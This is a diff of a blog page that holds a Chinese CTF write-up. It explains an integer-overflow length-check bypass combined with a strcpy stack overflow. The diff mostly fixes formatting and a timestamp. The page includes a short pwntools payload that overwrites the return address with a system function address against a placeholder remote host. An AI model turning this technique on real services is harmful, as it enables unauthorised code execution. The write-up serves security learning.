@@ -170,7 +170,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2020-09-10 22:43:08 / Modified: 22:42:15" itemprop="dateCreated datePublished" datetime="2020-09-10T22:43:08+08:00">2020-09-10</time>
+              <time title="Created: 2020-09-10 22:43:08 / Modified: 22:46:56" itemprop="dateCreated datePublished" datetime="2020-09-10T22:43:08+08:00">2020-09-10</time>
             </span>
 
           
@@ -202,7 +202,7 @@
 <p><img src="./7.png" alt="Alt text" title="Optional title"></p>
 <p>函数的起始地址为 <strong><em>0x0804868b</em></strong></p>
 <p><img src="./8.png" alt="Alt text" title="Optional title"></p>
-<h3 id="3-整体思路"><a href="#3-整体思路" class="headerlink" title="3.整体思路"></a>3.整体思路</h3><p>strcpy()函数的存在，使得dest的栈溢出成为了可能。<br>同时，v3的最大值只能取到255。<br>所以，只要我们控制输入密码的长度在259<del>263之间(或者其他可行的大小)，使整数溢出，从而间接控制v3处于 **3</del>8**之间。</p>
+<h3 id="3-整体思路"><a href="#3-整体思路" class="headerlink" title="3.整体思路"></a>3.整体思路</h3><p>strcpy()函数的存在，使得dest的栈溢出成为了可能。<br>同时，v3的最大值只能取到255。<br>所以，只要我们控制输入密码的长度在259~263之间(或者其他可行的大小)，使整数溢出，从而间接控制v3处于 <strong>3~8</strong>之间。</p>
 <p>我们只需在特定位置，把系统函数的地址写入s中，在控制s的长度，就可以绕过v3的密码长度检查，然后利用栈溢出，获取flag</p>
 <h3 id="4-编写payload"><a href="#4-编写payload" class="headerlink" title="4.编写payload"></a>4.编写payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r &#x3D; remote(&quot;ip&#x2F;url&quot;,port)</span><br><span class="line">r.sendlineafter(&quot;Your choice:&quot;,&#39;1&#39;)</span><br><span class="line">r.sendlineafter(&quot;your username&quot;,&#39;aaaa&#39;)</span><br><span class="line">r.sendlineafter(&quot;your passwd:&quot;,&#39;a&#39;*0x18+p32(sys_addr)+&#39;a&#39;*231)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
